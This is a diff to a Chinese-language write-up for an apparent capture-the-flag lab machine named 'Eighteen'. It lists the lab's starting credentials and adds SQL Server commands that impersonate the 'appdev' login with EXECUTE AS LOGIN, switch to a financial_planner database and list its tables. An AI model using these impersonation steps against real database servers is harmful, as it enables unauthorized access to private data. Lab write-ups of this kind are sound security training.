@@ -4,7 +4,6 @@
 机器信息:
 
 	像现实生活中常见的 Windows 渗透测试一样，你将使用以下账户凭证启动 Eighteen 盒子：kevin/iNa2we6haRj2gaw!
-
 #### 端口扫描
 
 ```
@@ -90,3 +89,16 @@ enum_impersonate
 ![[Pasted image 20251116205249.png]]
 **关键发现**：Kevin 可以假冒 `appdev` 登录!
 #### 模拟 appdev 并访问数据库
+```
+-- Impersonate appdev
+EXECUTE AS LOGIN = 'appdev';
+
+-- Verify
+SELECT SYSTEM_USER, USER_NAME();
+
+-- Access financial_planner database
+USE financial_planner;
+
+-- List tables
+SELECT name FROM sys.tables;
+```
